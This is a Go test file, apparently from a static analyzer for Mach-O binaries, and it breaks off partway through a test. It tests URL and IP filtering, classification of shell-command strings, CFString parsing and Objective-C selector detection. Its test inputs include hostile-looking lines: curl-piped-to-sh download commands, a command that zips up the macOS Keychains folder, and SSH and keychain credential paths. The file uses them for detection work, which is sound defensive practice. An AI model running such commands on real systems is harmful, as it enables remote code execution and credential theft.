	if got, ok := normalizeStaticURL("https://github.com/tauri-apps/tauri/issues/8306"); ok {
		t.Fatalf("Tauri issue URL should be filtered, got %q", got)
	}
	if got, ok := normalizeStaticURL("https://www.mongodb.com/supportability/documentdb"); ok {
		t.Fatalf("MongoDB supportability URL should be filtered, got %q", got)
	}
	if got, ok := normalizeStaticURL("https://www.mongodb.com/supportability/cosmosdbYou"); ok {
		t.Fatalf("MongoDB supportability string artifact should be filtered, got %q", got)
	}
	if got, ok := normalizeStaticURL("https://example.invalid/payload"); !ok || got != "https://example.invalid/payload" {
		t.Fatalf("payload URL should remain visible, got %q, %v", got, ok)
	}
	if got, ok := normalizeStaticURL("https://api.pcloud.com/uploadfile?path=%@"); !ok || got != "https://api.pcloud.com/uploadfile?path=%@" {
		t.Fatalf("cloud API URL should remain visible, got %q, %v", got, ok)
	}
}

func TestNormalizeMachOURLRejectsRawStringArtifacts(t *testing.T) {
	for _, raw := range []string{
		"http://$",
		"http://*/*",
		"http://.css",
		"http://Descriptionrelatively",
		"http://a@b?@c",
		"http://a@b@c/",
		"http://c",
		"http://www.css",
		"http://www.icon",
		"http://bad_host.example/payload",
		"http://example.1/payload",
	} {
		if got, ok := normalizeStaticURL(raw); ok {
			t.Fatalf("raw string artifact %q should be filtered, got %q", raw, got)
		}
	}
	for _, raw := range []string{
		"http://127.0.0.1",
		"http://127.0.0.1:",
		"http://localhost:8080/api",
		"https://api.example.invalid/payload",
		"https://adressesok.posten.no/nb/postal_codes/search",
	} {
		want := strings.TrimSuffix(raw, ":")
		if got, ok := normalizeStaticURL(raw); !ok || got != want {
			t.Fatalf("valid URL %q should normalize to %q, got %q, %v", raw, want, got, ok)
		}
	}
}

func TestNormalizeMachOIP(t *testing.T) {
	if got, ok := normalizeMachOIP("185.106.93.154,"); !ok || got != "185.106.93.154" {
		t.Fatalf("valid IPv4 should normalize, got %q, %v", got, ok)
	}
	for _, raw := range []string{"999.1.1.1", "not.an.ip", "2001:db8::1"} {
		if got, ok := normalizeMachOIP(raw); ok {
			t.Fatalf("invalid or unsupported IP %q should be rejected, got %q", raw, got)
		}
	}
}

func TestIPv4MatchesRejectEmbeddedDottedNumericTokensAndInvalidOctets(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		{name: "valid", input: "connect 46.17.63.144 now", want: []string{"46.17.63.144"}},
		{name: "embedded in longer dotted token", input: "OID.4.112.5.4.9", want: nil},
		{name: "invalid octet", input: "connect 999.1.2.3 now", want: nil},
		{name: "digit before candidate", input: "946.17.63.144", want: nil},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			matches, truncated := limitedMachOIPv4Matches(test.input)
			if truncated {
				t.Fatal("short input unexpectedly reached the IPv4 match limit")
			}
			var got []string
			for _, match := range matches {
				value, ok := validatedIPv4Match(test.input, match)
				if !ok {
					t.Fatalf("filtered match failed validation: %#v", match)
				}
				got = append(got, value)
			}
			if !slices.Equal(got, test.want) {
				t.Fatalf("IPv4 matches = %#v, want %#v", got, test.want)
			}
			if textGot := destinations(test.input); !slices.Equal(textGot, test.want) {
				t.Fatalf("text destinations = %#v, want %#v", textGot, test.want)
			}
		})
	}
	for _, test := range []struct {
		value string
		match []int
	}{
		{value: "946.17.63.144", match: []int{1, len("946.17.63.144")}},
		{value: "46.17.63.144.9", match: []int{0, len("46.17.63.144")}},
	} {
		if got, ok := validatedIPv4Match(test.value, test.match); ok {
			t.Fatalf("adjacent dotted-numeric boundary should reject %q in %q", got, test.value)
		}
	}
}

func TestNormalizeMachOURLSuppressesStaticCertificateDistributionURLs(t *testing.T) {
	for _, raw := range []string{
		"http://ocsp.verisign.com/",
		"http://aia1.netlock.hu/index.cgi?ca=gold04",
		"http://c.pki.goog/r/r1.crl",
		"http://ca.example.invalid/root.crt",
		"http://autorite.certigna.fr/certignarootca.der",
		"http://certificates.godaddy.com/repository/gd_intermediate.crt",
	} {
		if got, ok := normalizeStaticURL(raw); ok {
			t.Fatalf("static certificate URL %q should be filtered, got %q", raw, got)
		}
	}
}

func TestMachOStringLiteralRecognizesShellCommandsConservatively(t *testing.T) {
	seen := map[string]bool{}
	literals := appendInterestingStringValueLiterals(nil, seen, "curl https://literal.example/payload | sh", 0x1000, 64, 0)
	if !hasStringLiteralKind(literals, "shell-command") {
		t.Fatalf("expected shell-command literal, got %#v", literals)
	}
	if !hasStringLiteralKind(literals, "url") {
		t.Fatalf("expected URL literal to remain available, got %#v", literals)
	}

	seen = map[string]bool{}
	literals = appendInterestingStringValueLiterals(nil, seen, "https://literal.example/payload", 0x1000, 64, 0)
	if hasStringLiteralKind(literals, "shell-command") {
		t.Fatalf("bare URL should not be classified as a shell command: %#v", literals)
	}

	seen = map[string]bool{}
	literals = appendInterestingStringValueLiterals(nil, seen, "zip -rj /etc/kcbackup.cfg /Library/Keychains/", 0x1000, 64, 0)
	if !hasStringLiteralKind(literals, "shell-command") {
		t.Fatalf("expected archive command literal, got %#v", literals)
	}

	seen = map[string]bool{}
	literals = appendInterestingStringValueLiterals(nil, seen, "zip", 0x1000, 64, 0)
	if hasStringLiteralKind(literals, "shell-command") {
		t.Fatalf("bare tool name should not be classified as shell command: %#v", literals)
	}

	seen = map[string]bool{}
	literals = appendInterestingStringValueLiterals(nil, seen, "pbpaste", 0x1000, 64, 0)
	if !hasStringLiteralKind(literals, "shell-command") {
		t.Fatalf("bare pbpaste should remain available for called popen/system expansion: %#v", literals)
	}
	for _, value := range []string{"\npbpaste\n", strings.Repeat(" ", 4096) + "pbpaste"} {
		seen = map[string]bool{}
		literals = appendInterestingStringValueLiterals(nil, seen, value, 0x1000, len(value), 0)
		if hasStringLiteralKind(literals, "shell-command") {
			t.Fatalf("bounded bare-pbpaste exception accepted hostile padding %q", value[:min(len(value), 32)])
		}
	}

	for _, value := range []string{
		"./payload --config /tmp/config.json && /bin/sh -c 'curl https://literal.example/stage | sh'",
		"./payload --mode install &",
	} {
		seen = map[string]bool{}
		literals = appendInterestingStringValueLiterals(nil, seen, value, 0x1000, len(value), 0)
		if !hasStringLiteralKind(literals, "shell-command") {
			t.Fatalf("well-formed executable command %q should remain a shell-command candidate: %#v", value, literals)
		}
	}
}

func TestMachOStringLiteralRejectsConcatenatedRustCrateRun(t *testing.T) {
	// Rust &str constants are length-delimited rather than NUL-terminated. In a
	// Tauri binary, the printable scanner can therefore see many adjacent values
	// as one run. This reproduces the important shape from tauri-runtime-wry:
	// an executable-looking .cargo path followed by API names and Rust &str text.
	value := "./.cargo/registry/src/index.crates.io-6f17d22bba15001f/tauri-runtime-wry-0.14.8/src/global_shortcut.rs" +
		"getAppVersionregisterGlobalShortcutinvalid accelerator&str" +
		strings.Repeat("tauri_runtime_wry_window_event_dispatch_webview_callback", 18)
	if len(value) < 1000 || len(value) > 4096 {
		t.Fatalf("test fixture length = %d, want the bounded giant-string range", len(value))
	}

	seen := map[string]bool{}
	literals := appendInterestingStringValueLiterals(nil, seen, value, 0x1000, len(value), 0)
	if hasStringLiteralKind(literals, "shell-command") {
		t.Fatalf("concatenated Rust crate strings must not become a shell-command candidate: %#v", literals)
	}

	prose := "./.cargo/registry/src/index.crates.io/example/src/lib.rs; panicked at Result::unwrap"
	seen = map[string]bool{}
	literals = appendInterestingStringValueLiterals(nil, seen, prose, 0x1000, len(prose), 0)
	if hasStringLiteralKind(literals, "shell-command") {
		t.Fatalf("crate path followed by non-command diagnostic prose must not become a shell-command candidate: %#v", literals)
	}
}

func TestMachOStringLiteralRecognizesIPWithoutServiceManagement(t *testing.T) {
	seen := map[string]bool{}
	literals := appendInterestingStringValueLiterals(nil, seen, "185.106.93.154", 0x1000, 64, 0)
	if !hasStringLiteralKind(literals, "ip") {
		t.Fatalf("expected IP literal, got %#v", literals)
	}
	if hasStringLiteralKind(literals, "service-management-resource") {
		t.Fatalf("IP literal should not be classified as a ServiceManagement resource: %#v", literals)
	}
	if looksServiceManagementResource("185.106.93.154") {
		t.Fatal("IP literal should not look like a ServiceManagement resource")
	}
}

func TestMachOURLStringRecordsExactOffset(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	image := []byte("prefix https://offset.example/payload\x00")
	extractMachOInterestingStrings(&graph, content, &macho.File{}, "arm64", image)
	if len(graph.Evidence) != 1 || graph.Evidence[0].Kind != "url" {
		t.Fatalf("expected one URL evidence item, got %#v", graph.Evidence)
	}
	if graph.Evidence[0].Offset != int64(len("prefix ")) {
		t.Fatalf("URL evidence offset = %d, want %d", graph.Evidence[0].Offset, len("prefix "))
	}
	if len(graph.Network) != 0 || len(graph.Features) != 1 || graph.Features[0].Key != "network.url" || graph.Features[0].Value != "https://offset.example/payload" {
		t.Fatalf("raw URL should remain an unlinked feature, not an implementation observation: network=%#v features=%#v", graph.Network, graph.Features)
	}
}

func TestMachOIPStringStaysFeatureWithoutNetworkCall(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	image := []byte("prefix 46.17.63.144\x00")
	extractMachOInterestingStrings(&graph, content, &macho.File{}, "arm64", image)
	if len(graph.Evidence) != 1 || graph.Evidence[0].Kind != "ip" {
		t.Fatalf("expected one IP evidence item, got %#v", graph.Evidence)
	}
	if graph.Evidence[0].Offset != int64(len("prefix ")) {
		t.Fatalf("IP evidence offset = %d, want %d", graph.Evidence[0].Offset, len("prefix "))
	}
	if len(graph.Network) != 0 {
		t.Fatalf("unbound IP-like string should not become a network destination: %#v", graph.Network)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "network.ip" || graph.Features[0].Support != behavior.SupportHeuristic {
		t.Fatalf("expected network.ip feature, got %#v", graph.Features)
	}
}

func TestMachOIPv4FeatureRejectsEmbeddedAndInvalidCandidates(t *testing.T) {
	for _, value := range []string{"OID.4.112.5.4.9", "999.1.2.3"} {
		t.Run(value, func(t *testing.T) {
			var graph behavior.Graph
			extractMachOInterestingStrings(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "sample"}, &macho.File{}, "arm64", []byte(value+"\x00"))
			for _, feature := range graph.Features {
				if feature.Key == "network.ip" {
					t.Fatalf("invalid IPv4 candidate produced a feature: %#v", feature)
				}
			}
		})
	}
}

func TestMachOIPStringXrefStaysFunctionScopedFeatureWithoutNetworkCall(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: machoFunction{Name: "sendlog"},
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "ip", Value: "185.106.93.154"},
	})
	if len(graph.Network) != 0 {
		t.Fatalf("unbound function-scoped IP should not become a network destination: %#v", graph.Network)
	}
	if len(graph.Features) != 1 || graph.Features[0].Key != "network.ip" || graph.Features[0].SourceFunction != "sendlog" || graph.Features[0].Support != behavior.SupportHeuristic {
		t.Fatalf("missing function-scoped network.ip feature: %#v", graph.Features)
	}
}

func TestMachOSensitiveResourceStringRecordsOffset(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	seen := map[string]bool{}
	extractMachOSensitiveResourceString(&graph, content, "arm64", "~/Library/Keychains/login.keychain-db", 42, seen)
	if len(graph.Evidence) != 1 {
		t.Fatalf("expected one evidence item, got %#v", graph.Evidence)
	}
	if graph.Evidence[0].Offset != 42 {
		t.Fatalf("sensitive-resource evidence offset = %d, want 42", graph.Evidence[0].Offset)
	}
}

func TestCFStringLiteralsUseObjectAddressForXrefs(t *testing.T) {
	const (
		sectionVA     = 0x100003000
		sectionOffset = 0x300
		backingVA     = 0x100004000
	)
	value := "prefix https://cfstring-xref.example/payload"
	data := make([]byte, 32)
	binary.LittleEndian.PutUint64(data[16:24], backingVA)
	binary.LittleEndian.PutUint64(data[24:32], uint64(len(value)))

	literals := cfStringLiteralsFromData(binary.LittleEndian, sectionVA, sectionOffset, data, func(pointer, length uint64) (string, uint64, int, bool) {
		if pointer != backingVA || length != uint64(len(value)) {
			return "", 0, 0, false
		}
		return value, backingVA, 0x400, true
	})
	if len(literals) != 1 {
		t.Fatalf("cfStringLiteralsFromData() = %#v, want one URL literal", literals)
	}
	if literals[0].VA != sectionVA || literals[0].Offset != sectionOffset || literals[0].Size != 32 {
		t.Fatalf("CFString literal should cover object record, got %#v", literals[0])
	}
	if !literals[0].ValueLocationKnown || literals[0].ValueVA != backingVA+uint64(len("prefix ")) || literals[0].ValueOffset != 0x400+len("prefix ") {
		t.Fatalf("CFString value should retain backing-string coordinates, got %#v", literals[0])
	}
	got, ok := stringLiteralForVA(literals, sectionVA)
	if !ok || got.Value != "https://cfstring-xref.example/payload" {
		t.Fatalf("stringLiteralForVA(CFString object) = %#v, %v", got, ok)
	}
	index := newMachOStringLiteralIndex(literals)
	for _, interior := range []uint64{8, 16, 24} {
		if got, ok := stringLiteralForVA(literals, sectionVA+interior); ok {
			t.Fatalf("CFString interior +%d matched semantic literal %#v", interior, got)
		}
		if got, ok := index.forVA(sectionVA + interior); ok {
			t.Fatalf("indexed CFString interior +%d matched semantic literal %#v", interior, got)
		}
		instruction := make([]byte, 4)
		binary.LittleEndian.PutUint32(instruction, encodeTestADR(0, 0x100001000, sectionVA+interior))
		xrefs := arm64StringXrefs(
			&macho.File{ByteOrder: binary.LittleEndian}, 0x100001000, instruction,
			[]machoFunction{{Name: "main", Start: 0x100001000, End: 0x100001004}}, literals,
		)
		if len(xrefs) != 0 {
			t.Fatalf("CFString interior +%d created semantic xrefs: %#v", interior, xrefs)
		}
	}

	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "universal", ByteOffsetBase: 0x100}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:          0x100001004,
		RefOffset:      0x204,
		RefOffsetKnown: true,
		Function:       machoFunction{Name: "main", Start: 0x100001000, End: 0x100001020},
		Literal:        literals[0],
	})
	if len(graph.Evidence) != 2 || graph.Evidence[0].Method != "macho-literal" || graph.Evidence[0].VA != literals[0].ValueVA || graph.Evidence[0].Offset != int64(0x100+literals[0].ValueOffset) {
		t.Fatalf("CFString target evidence must identify the backing value bytes: %#v", graph.Evidence)
	}
}

func TestCFStringLiteralsRetainEqualValuesAtDistinctObjectAddresses(t *testing.T) {
	const sectionVA = uint64(0x100003000)
	value := "https://duplicate-cfstring.example/payload"
	data := make([]byte, 64)
	for offset, pointer := range []uint64{0x100004000, 0x100005000} {
		base := offset * 32
		binary.LittleEndian.PutUint64(data[base+16:base+24], pointer)
		binary.LittleEndian.PutUint64(data[base+24:base+32], uint64(len(value)))
	}
	literals := cfStringLiteralsFromData(binary.LittleEndian, sectionVA, 0x300, data, func(pointer, length uint64) (string, uint64, int, bool) {
		return value, pointer, int(pointer & 0xffff), length == uint64(len(value))
	})
	if len(literals) != 2 || literals[0].VA != sectionVA || literals[1].VA != sectionVA+32 {
		t.Fatalf("equal CFString values lost object identity: %#v", literals)
	}
}

func TestInterestingMachOStringLiteralsReadsLengthDelimitedCFStringBackingBytes(t *testing.T) {
	const (
		objectVA      = 0x100003000
		objectOffset  = 0x300
		backingVA     = 0x100004000
		backingOffset = 0x400
	)
	value := "prefix https://section-backed-cfstring.example/payload"
	objectData := make([]byte, 32)
	binary.LittleEndian.PutUint64(objectData[16:24], backingVA)
	binary.LittleEndian.PutUint64(objectData[24:32], uint64(len(value)))
	objectSection := testMachOSection("__cfstring", objectVA, objectData)
	objectSection.Offset = objectOffset
	// Bytes after the declared value prove the reader does not require a NUL
	// inside CFString's length window.
	backingSection := testMachOSection("__cstring", backingVA, append([]byte(value), []byte("\x00following")...))
	backingSection.Offset = backingOffset
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{objectSection, backingSection}}

	literals, truncated, cfBackingTruncated, cfTrailingBytes := interestingMachOStringLiterals(file, nil)
	if truncated || cfBackingTruncated || cfTrailingBytes != 0 {
		t.Fatal("small section-backed CFString fixture should not be truncated")
	}
	for _, literal := range literals {
		if literal.VA != objectVA || literal.Kind != "url" {
			continue
		}
		wantRelative := len("prefix ")
		if literal.Value != "https://section-backed-cfstring.example/payload" || !literal.ValueLocationKnown || literal.ValueVA != backingVA+uint64(wantRelative) || literal.ValueOffset != backingOffset+wantRelative {
			t.Fatalf("section-backed CFString coordinates = %#v", literal)
		}
		return
	}
	t.Fatalf("missing CFString object-address literal in %#v", literals)
}

func TestInterestingMachOStringLiteralsReportsMalformedCFStringRemainder(t *testing.T) {
	const (
		objectVA      = 0x100003000
		objectOffset  = 0x300
		backingVA     = 0x100004000
		backingOffset = 0x400
	)
	value := "https://complete-before-cf-remainder.example/payload"
	objectData := make([]byte, machOCFString64RecordSize+5)
	binary.LittleEndian.PutUint64(objectData[16:24], backingVA)
	binary.LittleEndian.PutUint64(objectData[24:32], uint64(len(value)))
	copy(objectData[machOCFString64RecordSize:], []byte{0xde, 0xad, 0xbe, 0xef, 0x01})
	objectSection := testMachOSection("__cfstring", objectVA, objectData)
	objectSection.Offset = objectOffset
	backingSection := testMachOSection("__cstring", backingVA, append([]byte(value), 0))
	backingSection.Offset = backingOffset
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{objectSection, backingSection}}

	literals, truncated, cfBackingTruncated, cfTrailingBytes := interestingMachOStringLiterals(file, nil)
	if truncated || cfBackingTruncated || cfTrailingBytes != 5 {
		t.Fatalf("malformed CFString remainder flags = truncated=%v backing=%v trailing=%d", truncated, cfBackingTruncated, cfTrailingBytes)
	}
	foundComplete := false
	for _, literal := range literals {
		if literal.VA == objectVA && literal.Value == value && literal.Size == machOCFString64RecordSize {
			foundComplete = true
		}
	}
	if !foundComplete {
		t.Fatalf("complete CFString record before malformed remainder was not retained: %#v", literals)
	}

	var graph behavior.Graph
	addMachOFunctionStringCoverage(&graph, "node-1", "arm64", truncated, cfBackingTruncated, cfTrailingBytes)
	want := "skipped 5 trailing __cfstring bytes that did not form complete 32-byte object records"
	if len(graph.Coverage) != 1 || graph.Coverage[0].AnalysisArea != "macho-function-strings/arm64" || graph.Coverage[0].Status != "partial" || graph.Coverage[0].Detail != want {
		t.Fatalf("malformed CFString remainder coverage = %#v", graph.Coverage)
	}
}

func TestMachOFunctionStringCoverageAttributesCFBackingBudget(t *testing.T) {
	var graph behavior.Graph
	addMachOFunctionStringCoverage(&graph, "node-1", "arm64", false, true, 0)

	want := fmt.Sprintf("CFString backing reads capped at %d cumulative bytes", maxMachOCFStringBackingBytes)
	if len(graph.Coverage) != 1 || graph.Coverage[0].AnalysisArea != "macho-function-strings/arm64" || graph.Coverage[0].Status != "partial" || graph.Coverage[0].Detail != want {
		t.Fatalf("CFString backing budget should have exact function-string coverage: %#v", graph.Coverage)
	}
	if strings.Contains(graph.Coverage[0].Detail, "ASCII string extraction") {
		t.Fatalf("CFString backing coverage was attributed to the whole-image ASCII scanner: %#v", graph.Coverage[0])
	}
}

func TestMachOCFStringReaderCachesAndCapsCumulativeBackingReads(t *testing.T) {
	section := testMachOSection("__cstring", 0x1000, []byte("ABCDWXYZ"))
	reader := newMachOCFStringReader(newMachOSectionIndex(&macho.File{Sections: []*macho.Section{section}}), 8)

	value, _, _, ok := reader.read(0x1000, 4)
	if !ok || value != "ABCD" || reader.truncated {
		t.Fatalf("first bounded read = %q, %v, truncated=%v", value, ok, reader.truncated)
	}
	remaining := reader.bytesRemaining
	value, _, _, ok = reader.read(0x1000, 4)
	if !ok || value != "ABCD" || reader.bytesRemaining != remaining {
		t.Fatalf("cached read was charged again: value=%q ok=%v remaining=%d want=%d", value, ok, reader.bytesRemaining, remaining)
	}
	if _, _, _, ok := reader.read(0x1004, 4); ok || !reader.truncated {
		t.Fatalf("distinct backing read exceeded the cumulative budget: ok=%v truncated=%v", ok, reader.truncated)
	}
}

func TestObjCCFStringCallArgumentRetainsObjectAndBackingLocations(t *testing.T) {
	const (
		objectVA      = uint64(0x2000)
		objectOffset  = uint32(0x180)
		backingVA     = uint64(0x3000)
		backingOffset = uint32(0x280)
	)
	value := "~/.ssh/id_rsa"
	object := make([]byte, machOCFString64RecordSize)
	binary.LittleEndian.PutUint64(object[16:24], backingVA)
	binary.LittleEndian.PutUint64(object[24:32], uint64(len(value)))
	objectSection := testMachOSection("__cfstring", objectVA, object)
	objectSection.Offset = objectOffset
	backingSection := testMachOSection("__cstring", backingVA, append([]byte(value), 0))
	backingSection.Offset = backingOffset
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{objectSection, backingSection}}
	reader := newMachOCFStringReader(newMachOSectionIndex(file), maxMachOCFStringBackingBytes)

	argument, ok := objcCFStringAtTargetLocationIndexed(file, reader, objectVA, false)
	if !ok {
		t.Fatal("expected exact static CFString argument")
	}
	if argument.Value != value || argument.LiteralVA != objectVA || argument.LiteralOffset != int(objectOffset) || argument.BackingVA != backingVA || argument.BackingOffset != int(backingOffset) || argument.Representation != "static-cfstring" {
		t.Fatalf("CFString argument lost exact object/backing provenance: %#v", argument)
	}
	if argument, ok := objcCFStringAtTargetLocationIndexed(file, reader, objectVA+1, false); ok {
		t.Fatalf("interior CFString address produced argument %#v", argument)
	}
}

func TestObjCCFStringCallArgumentSupportsExactPointerSlot(t *testing.T) {
	const (
		slotVA    = uint64(0x1800)
		objectVA  = uint64(0x2000)
		backingVA = uint64(0x3000)
	)
	value := "/tmp/benign-control"
	slot := make([]byte, 8)
	binary.LittleEndian.PutUint64(slot, objectVA)
	object := make([]byte, machOCFString64RecordSize)
	binary.LittleEndian.PutUint64(object[16:24], backingVA)
	binary.LittleEndian.PutUint64(object[24:32], uint64(len(value)))
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
		testMachOSection("__const", slotVA, slot),
		testMachOSection("__cfstring", objectVA, object),
		testMachOSection("__cstring", backingVA, []byte(value)),
	}}
	reader := newMachOCFStringReader(newMachOSectionIndex(file), maxMachOCFStringBackingBytes)

	argument, ok := objcCFStringAtTargetLocationIndexed(file, reader, slotVA, true)
	if !ok || argument.Value != value || argument.LiteralVA != objectVA || argument.BackingVA != backingVA {
		t.Fatalf("pointer-slot CFString argument = %#v, %v", argument, ok)
	}
}

func TestObjCCFStringCallArgumentRejectsMalformedAndBudgetedInputs(t *testing.T) {
	const (
		objectVA  = uint64(0x2000)
		backingVA = uint64(0x3000)
	)
	validObject := func(length uint64) []byte {
		object := make([]byte, machOCFString64RecordSize)
		binary.LittleEndian.PutUint64(object[16:24], backingVA)
		binary.LittleEndian.PutUint64(object[24:32], length)
		return object
	}
	tests := []struct {
		name       string
		objectName string
		object     []byte
		backing    []byte
		budget     uint64
		wantCapped bool
	}{
		{name: "wrong object section", objectName: "__const", object: validObject(4), backing: []byte("safe"), budget: 64},
		{name: "short object", objectName: "__cfstring", object: validObject(4)[:31], backing: []byte("safe"), budget: 64},
		{name: "zero length", objectName: "__cfstring", object: validObject(0), backing: []byte("safe"), budget: 64},
		{name: "oversized length", objectName: "__cfstring", object: validObject(maxMachOASCIIStringBytes + 1), backing: []byte("safe"), budget: maxMachOASCIIStringBytes + 1},
		{name: "non-printable backing", objectName: "__cfstring", object: validObject(4), backing: []byte{'o', 'k', 0, 'x'}, budget: 64},
		{name: "backing budget", objectName: "__cfstring", object: validObject(4), backing: []byte("safe"), budget: 0, wantCapped: true},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
				testMachOSection(test.objectName, objectVA, test.object),
				testMachOSection("__cstring", backingVA, test.backing),
			}}
			reader := newMachOCFStringReader(newMachOSectionIndex(file), test.budget)
			if argument, ok := objcCFStringAtTargetLocationIndexed(file, reader, objectVA, false); ok {
				t.Fatalf("malformed CFString produced argument %#v", argument)
			}
			if reader.truncated != test.wantCapped {
				t.Fatalf("reader.truncated = %v, want %v", reader.truncated, test.wantCapped)
			}
		})
	}
}

func TestObjectiveCSelectorMetadataFiltersToSelectors(t *testing.T) {
	data := []byte("doShellScript:\x00plain prose with spaces\x00dataTaskWithURL:completionHandler:\x00mainAppService\x00https://example.invalid/p\x00")
	items, truncated := objcSelectorStringsFromData(0x1000, 0x40, data)
	if truncated {
		t.Fatal("small Objective-C metadata input should not be truncated")
	}
	values := map[string]bool{}
	for _, item := range items {
		values[item.Value] = true
	}
	for _, want := range []string{"doShellScript:", "dataTaskWithURL:completionHandler:", "mainAppService"} {
		if !values[want] {
			t.Fatalf("missing selector %q in %#v", want, items)
		}
	}
	if values["plain prose with spaces"] || values["https://example.invalid/p"] {
		t.Fatalf("non-selectors should be rejected: %#v", items)
	}
	if !interestingObjectiveCSelector("doShellScript:") || !interestingObjectiveCSelector("dataTaskWithURL:completionHandler:") {
		t.Fatal("expected security/network selectors to be considered interesting")
	}
	if interestingObjectiveCSelector("initWithFrame:") {
		t.Fatal("ordinary UI selector should not be promoted as interesting metadata")
	}
}

func TestObjectiveCSelectorFeatureDoesNotCreateOperation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addObjectiveCSelectorFeature(&graph, content, "arm64", "__objc_selrefs", "objc.selector_ref", "objc-selector-ref", objcStringMetadata{
		VA:     0x1000,
		Offset: 64,
		Value:  "doShellScript:",
	}, 0x2000, map[string]bool{})

	if len(graph.Features) != 1 || graph.Features[0].Key != "objc.selector_ref" || graph.Features[0].Support != behavior.SupportDirect {
		t.Fatalf("selector metadata should be a proven feature: %#v", graph.Features)
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("selector metadata alone must not create operations: %#v", graph.Operations)
	}
}

func TestObjCMessageStubMapUsesLocalStubSymbols(t *testing.T) {
	file := &macho.File{
		Symtab: &macho.Symtab{Syms: []macho.Symbol{
			{Name: "_objc_msgSend$dataTaskWithURL:", Type: 0x0e, Sect: 1, Value: 0x1000},
			{Name: "_objc_msgSend$not a selector", Type: 0x0e, Sect: 1, Value: 0x1010},
			{Name: "_objc_msgSend$URLWithString:", Type: 0x0e, Sect: 2, Value: 0x2000},
		}},
		Sections: []*macho.Section{
			{SectionHeader: macho.SectionHeader{Name: "__objc_stubs", Seg: "__TEXT", Addr: 0x1000, Size: 0x40}},
			{SectionHeader: macho.SectionHeader{Name: "__text", Seg: "__TEXT", Addr: 0x2000, Size: 0x40}},
		},
	}

	got := objcMessageStubMap(file)
	if len(got) != 1 || got[0x1000] != "dataTaskWithURL:" {
		t.Fatalf("objcMessageStubMap() = %#v", got)
	}
}

func TestObjCMessageStubMapRequiresDefinedSymbolInExactStubSection(t *testing.T) {
	fixture := func(symbol macho.Symbol) map[uint64]string {
		file := &macho.File{
			Symtab: &macho.Symtab{Syms: []macho.Symbol{symbol}},
			Sections: []*macho.Section{
				{SectionHeader: macho.SectionHeader{Name: "__objc_stubs", Seg: "__TEXT", Addr: 0x1000, Size: 0x40}},
				{SectionHeader: macho.SectionHeader{Name: "__text", Seg: "__TEXT", Addr: 0x2000, Size: 0x40}},
			},
		}
		return objcMessageStubMap(file)
	}
	for _, test := range []struct {
		name   string
		symbol macho.Symbol
	}{
		{name: "undefined", symbol: macho.Symbol{Name: "_objc_msgSend$doShellScript:", Type: 0x01, Value: 0x1000}},
		{name: "common", symbol: macho.Symbol{Name: "_objc_msgSend$doShellScript:", Type: 0x01, Value: 8}},
		{name: "absolute", symbol: macho.Symbol{Name: "_objc_msgSend$doShellScript:", Type: 0x02, Value: 0x1000}},
		{name: "invalid ordinal", symbol: macho.Symbol{Name: "_objc_msgSend$doShellScript:", Type: 0x0e, Sect: 3, Value: 0x1000}},
		{name: "mismatched section", symbol: macho.Symbol{Name: "_objc_msgSend$doShellScript:", Type: 0x0e, Sect: 2, Value: 0x1000}},
	} {
		t.Run(test.name, func(t *testing.T) {
			if got := fixture(test.symbol); len(got) != 0 {
				t.Fatalf("invalid Objective-C stub symbol acquired selector semantics: %#v", got)
			}
		})
	}
	valid := fixture(macho.Symbol{Name: "_objc_msgSend$doShellScript:", Type: 0x0e, Sect: 1, Value: 0x1000})
	if valid[0x1000] != "doShellScript:" {
		t.Fatalf("defined exact-section Objective-C stub positive was lost: %#v", valid)
	}
}

func TestObjectiveCSelectorRefRequiresLiteralPointerSectionType(t *testing.T) {
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	selector := testMachOSection("__cstring", 0x3000, []byte("doShellScript:\x00"))
	for _, test := range []struct {
		name  string
		flags uint32
		seg   string
		want  bool
	}{
		{name: "literal pointers", flags: 0x5, seg: "__DATA", want: true},
		{name: "data const", flags: 0x5, seg: "__DATA_CONST", want: true},
		{name: "renamed regular section", flags: 0x0, seg: "__DATA", want: false},
		{name: "wrong segment", flags: 0x5, seg: "__TEXT", want: false},
	} {
		t.Run(test.name, func(t *testing.T) {
			refs := testMachOSection("__objc_selrefs", 0x2000, selrefData)
			refs.Flags = test.flags
			refs.Seg = test.seg
			file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{refs, selector}}
			if got, ok := readObjectiveCSelectorRefAtVA(file, 0x2000); ok != test.want || ok && got != "doShellScript:" {
				t.Fatalf("selector ref = %q, %v, want availability %v", got, ok, test.want)
			}
		})
	}
}

func TestObjCMessageStubCallAddsScopedFeatureOnlyForConstructorSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1020}}, map[uint64]string{
		0x2000: "URLWithString:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
